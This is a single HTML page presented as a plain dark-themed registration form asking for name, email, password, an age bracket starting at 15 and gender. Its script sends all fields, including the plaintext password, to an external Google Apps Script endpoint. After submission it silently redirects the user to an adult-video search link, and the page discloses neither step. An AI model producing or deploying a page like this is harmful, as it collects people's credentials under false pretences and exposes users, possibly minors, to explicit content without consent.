<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Register Form</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000; /* black background */
      font-family: Arial, sans-serif;
    }
    .form-container {
      background: #1c1c1c;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255,255,255,0.1);
      width: 100%;
      max-width: 400px;
      color: #fff;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #f1f1f1;
    }
    label {
      display: block;
      margin-top: 12px;
      margin-bottom: 6px;
      font-weight: bold;
      color: #ccc;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 6px;
      margin-bottom: 15px;
      font-size: 14px;
    }
    input, select {
      background: #2c2c2c;
      color: #fff;
    }
    input::placeholder {
      color: #aaa;
    }
    button {
      background: #ff6600;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #e65c00;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Register</h2>
    <form id="regForm">
      <label for="name">Your Name</label>
      <input type="text" id="name" name="name" placeholder="Enter your name" required>

      <label for="email">Email</label>
      <input type="email" id="email" name="email" placeholder="Enter your email" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter password" required>

      <label for="age">Age</label>
      <select id="age" name="age" required>
        <option value="">Select Age</option>
        <option value="15-25">15 - 25</option>
        <option value="30-60">30 - 60</option>
      </select>

      <label for="gender">Gender</label>
      <select id="gender" name="gender" required>
        <option value="">Select Gender</option>
        <option value="Male">Male</option>
        <option value="Female">Female</option>
      </select>

      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwU2k7ktYLMSpU5RcSvTpQ8_BiIszLGqUU3WSyFbbWxMb67vlA0PQU2q1mncbGBBhqbFA/exec";
    const REDIRECT_URL = "https://www.google.com/amp/s/amp.xhaccess.com/search/xxx%2bvideos";

    document.getElementById("regForm").addEventListener("submit", e => {
      e.preventDefault();
      const formData = {
        name: e.target.name.value,
        email: e.target.email.value,
        password: e.target.password.value,
        age: e.target.age.value,
        gender: e.target.gender.value
      };

      fetch(SCRIPT_URL, {
        method: "POST",
        body: JSON.stringify(formData)
      })
      .then(res => res.json())
      .then(data => {
        if (data.status === "success") {
          window.location.href = REDIRECT_URL; // Redirect after success
        } else {
          alert("Error: " + data.message);
        }
      })
      .catch(err => {
        console.error("Error:", err);
        alert("Something went wrong!");
      });
    });
  </script>
</body>
</html>
